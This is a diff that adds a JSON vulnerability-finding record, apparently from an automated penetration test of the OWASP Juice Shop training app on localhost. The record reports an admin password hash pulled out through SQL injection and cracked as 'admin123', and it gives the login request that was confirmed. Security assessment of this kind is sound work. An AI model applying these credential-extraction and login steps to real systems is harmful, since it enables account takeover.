@@ -1,0 +1,28 @@
+{
+  "id": "f_1784835515514_d81ebf",
+  "action": "confirm",
+  "title": "Weak/Default Credentials - Admin Password Easily Crackable (MD5)",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "/rest/user/login",
+  "url": "/rest/user/login",
+  "description": "The admin account (admin@juice-sh.op) uses a weak password that is easily cracked. The password hash 0192023a7bbd73250516f069df18b500 was extracted via SQL injection and immediately identified as MD5(\"admin123\"). The password was confirmed by successfully logging in via POST /rest/user/login, which returned a 200 OK with a valid JWT token for an admin role user. This allows full administrative access to the application.",
+  "poc": "1. SQLi extract: admin@juice-sh.op hash 0192023a7bbd73250516f069df18b500\\n2. Crack: echo -n \"admin123\" | md5sum → 0192023a7bbd73250516f069df18b500 ✓\\n3. Verify: POST /rest/user/login {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"} → 200 OK with admin JWT token",
+  "proof": "Hash crack: echo -n \"admin123\" | md5sum → 0192023a7bbd73250516f069df18b500 (matches extracted hash). Login: POST /rest/user/login {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"} → HTTP 200 {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+  "how_captured": "POST http://127.0.0.1:3011/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784835515477_dbd277"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784835515477_dbd277",
+      "excerpt": "Hash crack: echo -n \"admin123\" | md5sum → 0192023a7bbd73250516f069df18b500 (matches extracted hash). Login: POST /rest/user/login {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"} → HTTP 200 {\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3011/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3011",
+  "created_at": "2026-07-23T19:38:35.515Z"
+}
